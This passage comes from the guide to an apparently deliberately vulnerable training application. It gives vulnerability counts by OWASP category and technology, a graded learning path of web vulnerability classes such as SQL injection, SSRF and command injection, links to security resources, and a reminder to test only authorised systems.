- A07 (Identification and Authentication): 1
- A08 (Software and Data Integrity): 1
- A09 (Logging and Monitoring): 2
- A10 (SSRF): 1

### By Technology
- Node.js/Express: 15
- Python/Flask: 18
- Go: 6
- React: 9

---

## Learning Path

**Beginner** → Start with:
1. SQL Injection (Auth Service)
2. XSS (Frontend)
3. IDOR (Order Service)
4. Missing Authentication (User Service)

**Intermediate** → Progress to:
5. SSRF (Product Service)
6. NoSQL Injection (User Service)
7. XXE (Order Service)
8. Mass Assignment (Multiple Services)

**Advanced** → Master:
9. SSTI (Notification Service)
10. Race Conditions (Payment Service)
11. Insecure Deserialization (Product Service)
12. Command Injection (Notification Service)

---

## Additional Resources

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **CWE Top 25**: https://cwe.mitre.org/top25/
- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
- **HackTricks**: https://book.hacktricks.xyz/

---

**Remember**: Use this knowledge ethically and legally. Only test systems you own or have explicit permission to test.